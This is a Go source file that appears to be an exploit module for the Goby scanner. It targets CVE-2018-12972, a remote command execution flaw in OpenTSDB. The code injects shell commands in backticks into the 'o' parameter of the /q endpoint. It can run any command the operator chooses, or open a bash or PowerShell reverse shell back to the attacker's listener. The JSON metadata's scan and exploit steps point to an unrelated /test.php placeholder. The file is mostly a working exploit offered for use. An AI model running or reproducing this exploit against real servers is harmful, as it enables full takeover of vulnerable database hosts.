package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "OpenTSDB DataBase q File o Parameter Remote Command Execution Vulnerability (CVE-2018-12972)",
    "Description": "<p>OpenTSDB is an open source, scalable distributed time series database.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "OpenTSDB",
    "Homepage": "https://github.com/OpenTSDB/opentsdb/",
    "DisclosureDate": "2018-06-28",
    "Author": "h1ei1",
    "FofaQuery": "title=\"OpenTSDB\" || body=\"s/queryui.nocache.js\" || body=\"s/opentsdb_header.jpg\"",
    "GobyQuery": "title=\"OpenTSDB\" || body=\"s/queryui.nocache.js\" || body=\"s/opentsdb_header.jpg\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/OpenTSDB/opentsdb/\">https://github.com/OpenTSDB/opentsdb/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "linux,windows",
            "show": "attackType=reverse"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2018-12972"
    ],
    "CNNVD": [
        "CNNVD-201807-048"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "OpenTSDB 数据库 q 文件 o 参数远程命令执行漏洞 （CVE-2018-12972）",
            "Product": "OpenTSDB",
            "Description": "<p>OpenTSDB是一套开源的、可扩展的分布式时间序列数据库。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://github.com/OpenTSDB/opentsdb/\">https://github.com/OpenTSDB/opentsdb/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "OpenTSDB DataBase q File o Parameter Remote Command Execution Vulnerability (CVE-2018-12972)",
            "Product": "OpenTSDB",
            "Description": "<p>OpenTSDB is an open source, scalable distributed time series database.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://github.com/OpenTSDB/opentsdb/\">https://github.com/OpenTSDB/opentsdb/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-20",
    "PocId": "10836"
}`
	sendMetricsPayload23579dsfgmg := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := "/suggest?type=metrics"
		sendConfig := httpclient.NewGetRequestConfig(uri)
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, sendConfig)
		if err != nil {
			return resp, err
		}
		return resp, nil
	}

	sendAggregatorsPayload158762sdfgsd := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/aggregators")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}
	sendPocPayload1248321fjqwbfvh := func(hostInfo *httpclient.FixUrl, aggregators, metrics []string) (*httpclient.HttpResponse, error) {
		uri := fmt.Sprintf("/q?start=2006/06/27-00:00:15&end=2030/03/26-20:37:33&m=%s:%s&o=%%60123|md5sum%%60&yrange=[0:]&y2range=[0:]&style=linespoint&wxh=1149x494&json", aggregators[1], metrics[1])
		sendConfig := httpclient.NewGetRequestConfig(uri)
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	sendExpPayload45932fjweo := func(hostInfo *httpclient.FixUrl, aggregators, metrics []string, cmd string) (*httpclient.HttpResponse, error) {
		uri := fmt.Sprintf("/q?start=2006/06/27-00:00:15&end=2030/03/26-20:37:33&m=%s:%s&o=%%60%s%%60&yrange=[0:]&y2range=[0:]&style=linespoint&wxh=1149x494&json", aggregators[1], metrics[1], strings.ReplaceAll(url.QueryEscape(cmd), "%2B", "%20"))
		sendConfig := httpclient.NewGetRequestConfig(uri)
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, err := sendMetricsPayload23579dsfgmg(hostInfo)
			if err != nil || !strings.Contains(resp.HeaderString.String(), "application/json") {
				return false
			}
			metrics := regexp.MustCompile("\\[\"(.*?)\"").FindStringSubmatch(resp.RawBody)
			resp, err = sendAggregatorsPayload158762sdfgsd(hostInfo)
			if err != nil || !strings.Contains(resp.HeaderString.String(), "application/json") {
				return false
			}
			aggregators := regexp.MustCompile("\\[\"(.*?)\",").FindStringSubmatch(resp.RawBody)
			resp, err = sendPocPayload1248321fjqwbfvh(hostInfo, aggregators, metrics)
			return err == nil && strings.Contains(resp.HeaderString.String(), "application/json") && strings.Contains(resp.RawBody, "d41d8cd98f00b204e9800998ecf8427e")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			var cmd string
			waitSessionCh := make(chan string)
			if attackType == "reverse" {
				reverse := goutils.B2S(ss.Params["reverse"])
				if reverse == "linux" {
					reversePort, err := godclient.WaitSession("reverse_linux", waitSessionCh)
					if err != nil || len(reversePort) == 0 {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					cmd = godclient.ReverseTCPByBash(reversePort)
				} else {
					reversePort, err := godclient.WaitSession("reverse_windows", waitSessionCh)
					if err != nil || len(reversePort) == 0 {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					cmd = godclient.ReverseTCPByPowershell(reversePort)
				}
			} else if attackType == "cmd" {
				cmd = goutils.B2S(ss.Params["cmd"])
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}

			resp, err := sendMetricsPayload23579dsfgmg(expResult.HostInfo)
			if err != nil || !strings.Contains(resp.HeaderString.String(), "application/json") {
				expResult.Output = err.Error()
				return expResult
			}
			metrics := regexp.MustCompile("\\[\"(.*?)\"").FindStringSubmatch(resp.RawBody)
			resp, err = sendAggregatorsPayload158762sdfgsd(expResult.HostInfo)
			if err != nil || !strings.Contains(resp.HeaderString.String(), "application/json") {
				expResult.Output = err.Error()
				return expResult
			}
			aggregators := regexp.MustCompile("\\[\"(.*?)\",").FindStringSubmatch(resp.RawBody)
			resp, err = sendExpPayload45932fjweo(expResult.HostInfo, aggregators, metrics, cmd)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			}
			if attackType == "cmd" {
				if !(strings.Contains(resp.RawBody, "Gnuplot stderr:") && strings.Contains(resp.HeaderString.String(), "application/json")) {
					return expResult
				}
				reg := regexp.MustCompile(`}\\"(.*?)\\n`)
				match := reg.FindStringSubmatch(resp.RawBody)
				if len(match) >= 2 {
					desiredData := match[1]
					expResult.Success = true
					expResult.Output = desiredData
				}
				return expResult
			} else {
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
				}
			}
			return expResult
		},
	))
}
